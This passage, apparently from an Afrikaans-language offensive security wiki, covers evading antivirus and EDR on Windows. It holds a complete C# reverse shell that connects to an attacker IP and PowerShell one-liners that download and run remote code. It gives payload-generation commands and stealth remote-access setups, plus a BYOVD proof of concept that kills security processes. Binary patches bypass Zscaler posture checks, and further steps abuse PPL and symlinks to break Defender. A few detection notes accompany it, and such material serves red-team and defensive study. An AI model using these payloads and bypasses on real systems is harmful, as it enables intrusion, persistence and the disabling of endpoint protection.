- [**metame**](https://github.com/a0rtega/metame): Metame is ’n eenvoudige metamorphic code engine vir arbitrêre executable-lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is ’n fynkorrelige code obfuscation-framework vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer ’n program op assembly-code-vlak deur gewone instruksies in ROP chains te transformeer, wat ons natuurlike begrip van normale control flow verydel.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is ’n .NET PE Crypter wat in Nim geskryf is
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL in shellcode omskakel en dit dan laai

## SmartScreen & MoTW

Jy het moontlik hierdie skerm gesien wanneer jy sommige executables van die internet aflaai en dit uitvoer.

Microsoft Defender SmartScreen is ’n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoering van potensieel kwaadwillige applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik volgens ’n reputasiegebaseerde benadering, wat beteken dat ongewoon afgelaaide applications SmartScreen sal aktiveer en die eindgebruiker dus sal waarsku en verhoed om die lêer uit te voer (hoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is ’n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontrolering van die Zone.Identifier ADS vir ’n lêer wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat executables wat met ’n **vertroude** signing certificate onderteken is, **nie SmartScreen sal aktiveer nie**.

’n Baie effektiewe manier om te voorkom dat jou payloads die Mark of The Web kry, is om hulle binne ’n soort houer, soos ’n ISO, te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **nie-NTFS** volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is ’n tool wat payloads in output-houers verpak om Mark-of-the-Web te omseil.

Voorbeeldgebruik:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is ’n demo vir die omseiling van SmartScreen deur payloads binne ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is ’n kragtige logging-meganisme in Windows wat toepassings en stelselkomponente toelaat om **events te log**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en op te spoor.

Soortgelyk aan hoe AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die user space-proses onmiddellik te laat terugkeer sonder om enige events te log. Dit word gedoen deur die funksie in memory te patch sodat dit onmiddellik terugkeer, wat ETW-logging vir daardie proses effektief deaktiveer.

Jy kan meer inligting vind by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) en [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Die laai van C#-binaries in memory is al geruime tyd bekend en dit is steeds ’n baie goeie manier om jou post-exploitation tools uit te voer sonder om deur AV opgespoor te word.

Aangesien die payload direk in memory gelaai sal word sonder om aan disk te raak, hoef ons net bekommerd te wees oor die patch van AMSI vir die hele proses.

Die meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in memory uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels dat ’n **nuwe sacrificial process geskep word**, jou post-exploitation-kwaadwillige code in daardie nuwe proses geïnject word, jou kwaadwillige code uitgevoer word en die nuwe proses beëindig word wanneer dit klaar is. Dit het beide voordele en nadele. Die voordeel van die fork and run-metode is dat uitvoering **buite** ons Beacon implant-proses plaasvind. Dit beteken dat indien iets in ons post-exploitation-aksie verkeerd loop of opgespoor word, daar ’n **baie groter kans** is dat ons **implant oorleef.** Die nadeel is dat jy ’n **groter kans** het om deur **Behavioural Detections** opgespoor te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan daaroor om die post-exploitation-kwaadwillige code **in sy eie proses** te inject. Op hierdie manier kan jy vermy om ’n nuwe proses te skep en dit deur AV te laat scan, maar die nadeel is dat indien iets met die uitvoering van jou payload verkeerd loop, daar ’n **baie groter kans** is dat jy jou **beacon verloor**, aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer oor C# Assembly loading wil lees, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **van PowerShell af** laai; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige code met ander tale uit te voer deur die gekompromitteerde machine toegang te gee **tot die interpreter environment wat op die Attacker Controlled SMB share geïnstalleer is**.

Deur toegang tot die Interpreter Binaries en die environment op die SMB share toe te laat, kan jy **arbitrêre code in hierdie tale binne die memory** van die gekompromitteerde machine uitvoer.

Die repo dui aan: Defender scan steeds die scripts, maar deur Go, Java, PHP, ens. te gebruik, het ons **meer buigsaamheid om static signatures te omseil**. Toetsing met random, un-obfuscated reverse shell scripts in hierdie tale was suksesvol.

## TokenStomping

Token stomping is ’n tegniek wat ’n attacker toelaat om die access token of ’n security prouct soos ’n EDR of AV te **manipuleer**, sodat hulle die privileges daarvan kan verminder. Die proses sal dan nie sterf nie, maar sal nie permissions hê om vir kwaadwillige aktiwiteite te check nie.

Om dit te voorkom, kan Windows **eksterne prosesse verhinder** om handles oor die tokens van security processes te verkry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**hierdie blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om eenvoudig die Chrome Remote Desktop op ’n victim se PC te deploy en dit dan te gebruik om beheer daaroor oor te neem en persistence te handhaaf:
1. Download vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer te download.
2. Run die installer silently op die victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik next. Die wizard sal jou dan vra om te authorize; klik die Authorize-knoppie om voort te gaan.
4. Execute die gegewe parameter met ’n paar aanpassings: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin-param wat dit moontlik maak om die pin te stel sonder om die GUI te gebruik).


## Advanced Evasion

Evasion is ’n baie ingewikkelde onderwerp. Soms moet jy baie verskillende telemetry-bronne in net een stelsel in ag neem, dus is dit feitlik onmoontlik om heeltemal onopgespoor te bly in volwasse environments.

Elke environment waarteen jy optree, sal sy eie sterk- en swakpunte hê.

Ek moedig jou sterk aan om hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) te gaan kyk om ’n beginpunt in meer Advanced Evasion-tegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog ’n uitstekende praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik, wat **dele van die binary sal verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig identifiseer en dit aan jou uitwys.\
Nog ’n tool wat **dieselfde ding doen, is** [**avred**](https://github.com/dobin/avred), met ’n oop web-aanbieding van die diens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot en met Windows10 het alle Windows-weergawes ’n **Telnet server** ingesluit wat jy kon installeer (as administrator) deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel gestart word en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet-poort** (stealth) **en deaktiveer firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin-downloads hê, nie die setup nie)

**OP DIE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die server:

- Aktiveer die opsie _Disable TrayIcon_
- Stel ’n wagwoord in by _VNC Password_
- Stel ’n wagwoord in by _View-Only Password_

Skuif dan die binary _**winvnc.exe**_ en die **nuut** geskepte lêer _**UltraVNC.ini**_ binne die **victim**

#### **Reverse connection**

Die **attacker** moet die binary `vncviewer.exe -listen 5900` **binne sy** **host** uitvoer sodat dit **voorbereid** sal wees om ’n reverse **VNC connection** te ontvang. Begin dan binne die **victim** die winvnc daemon met `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WAARSKUWING:** Om stealth te handhaaf, moet jy ’n paar dinge nie doen nie

- Moenie `winvnc` begin as dit reeds loop nie, anders sal jy ’n [popup](https://i.imgur.com/1SROTTl.png) aktiveer. Kontroleer of dit loop met `tasklist | findstr winvnc`
- Moenie `winvnc` sonder `UltraVNC.ini` in dieselfde gids begin nie, anders sal dit veroorsaak dat [die config window](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moenie `winvnc -h` vir hulp uitvoer nie, anders sal jy ’n [popup](https://i.imgur.com/oc18wcu.png) aktiveer

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Begin nou die **listener** met `msfconsole -r file.rc` en **execute** die **xml payload** met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Die huidige defender sal die proses baie vinnig beëindig.**

### Compiling our own reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Compileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# met behulp van compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C#-obfuskators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik python vir build injectors-voorbeeld:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Maak AV/EDR Vanuit Kernel Space Dood

Storm-2603 het ’n klein console utility genaamd **Antivirus Terminator** gebruik om endpoint-beskerming te deaktiveer voordat ransomware afgelaai is. Die tool bring sy **eie kwesbare maar *getekende* driver** en misbruik dit om bevoorregte kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Belangrike punte
1. **Getekende driver**: Die lêer wat na die skyf gelewer word, is `ServiceMouse.sys`, maar die binary is die wettig getekende driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver ’n geldige Microsoft-signature dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as ’n **kernel service** en die tweede een start dit sodat `\\.\ServiceMouse` vanuit user land toeganklik word.
3. **IOCTLs wat deur die driver blootgestel word**
| IOCTL code | Vermoë                                  |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate ’n arbitrêre proses volgens PID (gebruik om Defender/EDR-dienste dood te maak) |
| `0x990000D0` | Delete ’n arbitrêre lêer op die skyf |
| `0x990001D0` | Unload die driver en remove die service |

Minimale C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Waarom dit werk**: BYOVD omseil user-mode-beskerming volledig; code wat in die kernel uitvoer, kan *protected* prosesse oopmaak, hulle terminate, of met kernel-objects peuter ongeag PPL/PP, ELAM of ander hardening features.

Detection / Mitigation
•  Enable Microsoft se vulnerable-driver block list (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor die skepping van nuwe *kernel*-dienste en genereer ’n alert wanneer ’n driver vanuit ’n world-writable directory gelaai word of nie op die allow-list voorkom nie.
•  Monitor user-mode-handles na custom device objects, gevolg deur verdagte `DeviceIoControl`-calls.

### Omseil Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler se **Client Connector** pas device-posture-reëls plaaslik toe en maak staat op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak ’n volledige bypass moontlik:

1. Posture-evaluasie gebeur **heeltemal client-side** (’n boolean word na die server gestuur).
2. Internal RPC-endpoints valideer slegs dat die executable **deur Zscaler geteken** is (via `WinVerifyTrust`).

Deur **vier signed binaries op die skyf te patch**, kan albei meganismes geneutraliseer word:

| Binary | Oorspronklike logika wat gepatch is | Resultaat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Returns altyd `1`, sodat elke check compliant is |
| `ZSAService.exe` | Indirecte call na `WinVerifyTrust` | NOP-ed ⇒ enige (selfs unsigned) proses kan aan die RPC-pipes bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity-checks op die tunnel | Short-circuited |

Minimale patcher-uittreksel:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nadat die oorspronklike lêers vervang en die diensstapel herbegin is:

* **Alle** posture checks vertoon **green/compliant**.
* Ongesignede of gewysigde binaries kan die named-pipe RPC endpoints oopmaak (byvoorbeeld `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde host verkry onbeperkte toegang tot die interne netwerk wat deur die Zscaler-beleide gedefinieer word.

Hierdie gevallestudie demonstreer hoe suiwer client-side trust decisions en eenvoudige signature checks met ’n paar byte patches omseil kan word.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te manipuleer

Protected Process Light (PPL) dwing ’n signer/level hierarchy af sodat slegs protected processes met dieselfde of ’n hoër vlak mekaar kan manipuleer. Aanvallend gesproke, as jy ’n PPL-enabled binary wettiglik kan launch en sy arguments kan beheer, kan jy benign functionality (byvoorbeeld logging) omskep in ’n beperkte, PPL-backed write primitive teen protected directories wat deur AV/EDR gebruik word.

Wat ’n process as PPL laat run
- Die target EXE (en enige loaded DLLs) moet met ’n PPL-capable EKU gesign wees.
- Die process moet met CreateProcess geskep word deur die flags te gebruik: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- ’n Compatible protection level moet aangevra word wat met die signer van die binary ooreenstem (byvoorbeeld `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware signers, `PROTECTION_LEVEL_WINDOWS` vir Windows signers). Verkeerde levels sal tydens creation fail.

Sien ook ’n breër inleiding tot PP/PPL en LSASS protection hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (kies die protection level en stuur arguments aan die target EXE deur):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signed system binary `C:\Windows\System32\ClipUp.exe` spawn homself en aanvaar ’n parameter om ’n log file na ’n caller-specified path te skryf.
- Wanneer dit as ’n PPL process geloods word, vind die file write met PPL-backing plaas.
- ClipUp kan nie paths wat spasies bevat, parse nie; gebruik 8.3 short paths om na normaalweg protected locations te wys.

8.3 short path helpers
- Lys short names: `dir /x` in elke parent directory.
- Lei die short path in cmd af: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur ’n launcher (bv. CreateProcessAsPPL) te gebruik.
2) Gee die ClipUp log-path argument deur om file creation in ’n protected AV directory (bv. Defender Platform) af te dwing. Gebruik 8.3 short names indien nodig.
3) Indien die target binary normaalweg deur die AV oopgemaak/gelock word terwyl dit loop (bv. MsMpEng.exe), schedule die write tydens boot voordat die AV start deur ’n auto-start service te installeer wat betroubaar vroeër loop. Validate boot ordering met Process Monitor (boot logging).
4) Met reboot vind die PPL-backed write plaas voordat die AV sy binaries lock, wat die target file korrupteer en startup voorkom.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas en beperkings
- Jy kan nie die inhoud beheer wat ClipUp skryf nie; die primitive is geskik vir korrupsie eerder as presiese inhouds-inspuiting.
- Vereis plaaslike admin/SYSTEM om 'n diens te installeer/te begin en 'n herlaaivenster.
- Tydsberekening is krities: die teiken moet nie oop wees nie; uitvoering tydens selflaai vermy lêerslotte.

Deteksies
- Prosesskepping van `ClipUp.exe` met ongewone argumente, veral wanneer dit deur nie-standaard launchers begin word, rondom selflaai.
- Nuwe dienste wat gekonfigureer is om verdagte binaries outomaties te begin en konsekwent voor Defender/AV te begin. Ondersoek diensskepping/-wysiging voordat Defender se opstartfoute voorkom.
- Lêerintegriteitsmonitering op Defender-binaries/Platform-gidse; onverwagte lêerskeppings/-wysigings deur prosesse met protected-process-vlae.
- ETW/EDR-telemetrie: soek na prosesse wat met `CREATE_PROTECTED_PROCESS` geskep is en abnormale PPL-vlakgebruik deur nie-AV-binaries.

Versagtingsmaatreëls
- WDAC/Code Integrity: beperk watter ondertekende binaries as PPL mag loop en onder watter ouerprosesse; blokkeer ClipUp-aanroepe buite wettige kontekste.
- Dienshigiëne: beperk skepping/wysiging van outomatiese opstartdienste en monitor wysigings aan die opstartvolgorde.
- Maak seker Defender se tamper protection en early-launch-beskermings is geaktiveer; ondersoek opstartfoute wat op binary-korrupsie dui.
- Oorweeg dit om 8.3-kortnaamgenerering op volumes wat sekuriteitnutsgoed huisves, te deaktiveer indien dit met jou omgewing versoenbaar is (toets deeglik).

Verwysings vir PPL en nutsgoed
- Microsoft Protected Processes-oorsig: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU-verwysing: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon-selflaailogboek (volgordevalidering): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL-launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Tegniekbeskrywing (ClipUp + PPL + wysiging van selflaaivolgorde): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulering van Microsoft Defender via Platform-weergawemap-simboliese-skakelkaping

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

te enumerer.

Dit kies die subgids met die hoogste leksikografiese weergawestring (byvoorbeeld `4.18.25070.5-0`), en begin dan die Defender-diensprosesse daarvandaan (met diens-/registerpaaie wat dienooreenkomstig opgedateer word). Hierdie seleksie vertrou op gidsinskrywings, insluitend directory reparse points (simboliese skakels). 'n Administrateur kan dit benut om Defender na 'n aanvaller-skryfbare pad te herlei en DLL sideloading of diensonderbreking te bewerkstellig.

Voorvereistes
- Plaaslike Administrator (nodig om gidse/simboliese skakels onder die Platform-gids te skep)
- Vermoë om te herlaai of Defender se platformherseleksie te aktiveer (diensherbegin tydens selflaai)
- Slegs ingeboude nutsgoed word benodig (mklink)

Waarom dit werk
- Defender blokkeer skryfbewerkings in sy eie gidse, maar sy platformseleksie vertrou op gidsinskrywings en kies die leksikografies hoogste weergawe sonder om te valideer of die teiken na 'n beskermde/vertroude pad oplos.

Stap-vir-stap (voorbeeld)
1) Berei 'n skryfbare kloon van die huidige platformgids voor, byvoorbeeld `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep 'n directory symlink met 'n hoër weergawe binne Platform wat na jou gids wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Snellerkeuse (herlaai aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die herlei pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
